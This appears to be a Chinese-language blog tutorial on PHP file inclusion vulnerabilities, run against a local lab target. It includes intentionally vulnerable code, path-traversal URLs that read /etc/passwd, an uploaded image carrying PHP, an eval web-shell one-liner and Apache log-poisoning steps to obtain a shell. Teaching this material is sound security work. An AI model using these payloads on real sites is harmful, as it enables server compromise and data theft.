---
layout: post
title: web常见漏洞一
categories: 网络安全
description: web常见漏洞一
keywords: 文件包含漏洞
---

文件包含漏洞

### 1、文件包含漏洞描述

程序在引用文件的时，引用的文件名，用户可控的情况，传入的文件名没有经过合理的校验或校验不严，从而操作了预想之外的文件，就有可能导致文件泄漏和恶意的代码注入。

程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这重文件调用的过程一般被称为文件包含。

程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。

几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在 PHP Web Application 中居多,而在 JSP、ASP、ASP.NET 程序中却非常少，甚至没有，这是有些语言设计的弊端。在 PHP 中经常出现包含漏洞，但这并不意味这其他语言不存在。

### 2、PHP中常见文件包含函数

1. include()：执行到 include 时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行
2. require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本
3. include_once()和 require_once()：若文件中代码已被包含则不会再次包含

漏洞部分代码如下

```php
$html='';
if(isset($_GET['submit']) && $_GET['filename']!=null){
    $filename=$_GET['filename'];
    include "include/$filename";//变量传进来直接包含,没做任何的安全限制
//     //安全的写法,使用白名单，严格指定包含的文件名
//     if($filename=='file1.php' || $filename=='file2.php' || $filename=='file3.php' || $filename=='file4.php' || $filename=='file5.php'){
//         include "include/$filename";

//     }
}
```

$_GET['filename'] 接收客户端传的参数，其中没有任何过滤 带入到 include 函数中，include 包含这个文件，引入到当前文件中，因此会造成文件包含漏洞。

### 3、文件包含漏洞的利用方法

文件包含漏洞，需要引入上传的文件到网站目录，或是服务器内部的文件，而且是权限是可读，才能引入进来，或远程包含进来，但是需要条件。

#### 3.1 本地包含文件

本地包含文件，被包含的文件在本地。

如上代码，没有做安全校验，直接读取当前目录下的文件，我们可以传入`../`一层一层的返回，去查找敏感文件，如下：

```txt
http://192.168.3.16/06/vul/fileinclude/fi_local.php?filename=../../../../../../../etc/passwd&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```

直到查找到文件，找到之后会返回在页面上

```txt
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
。。。。省略下面很多内容
```

确认有这个漏洞，可以找个地方上传一个图片或者文件，新建一个文件，输入`<?php phpinfo();?>`然后把后缀改成`.jpg`，然后上传，拿到上传的路径，用上面的办法去找到文件上传到的路径

```txt
图片上传的位置为：06/vul/unsafeupload/uploads/s.jpg
漏洞包含的文件夹位置为：06/vul/fileinclude/include
所以构建的请求链接为：http://192.168.3.16/06/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/s.jpg&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```

就可以根据相对路径找到存在攻击语句的图片了。如果是一句话`eval($POST['cmd']);`的话，可以直接用蚁剑进行连接，直接管理这个站。

### 4、包含日志文件 getshell

中间件例如 iis 、apache、nginx 这些 web 中间件，都会记录访问日志，如果访问日志中或错误日志中，存在有 php 代码，也可以引入到文件包含中。如果日志有 php 恶意代码，也可导致 getshell。

使用 burp suite 访问 GET 填写` <?php phpinfo();eval($_POST[cmd]);?>`，或者直接URL修改

```txt
http://192.168.3.16/06/vul/fileinclude/fi_local.php?filename=<?php phpinfo();?>
```

这条语句肯定是会报错的，进入到错误日志里面。浏览器可能会进行编码，可以用burp suite抓包直接在包里面进行修改即可。

在linux下日志文件权限默认是root 而php的权限是www-data 一般情况下都是读取不了，如果是windows环境下是可以权限是允许的。

linux 默认的 apache访问日志文件路径是：`/var/log/apache2/access.log`

linux 默认的 apache错误日志文件路径是：`/var/log/apache2/error.log`

如果权限足够，包含`/var/log/apache2/error.log`这个文件就能 getshell
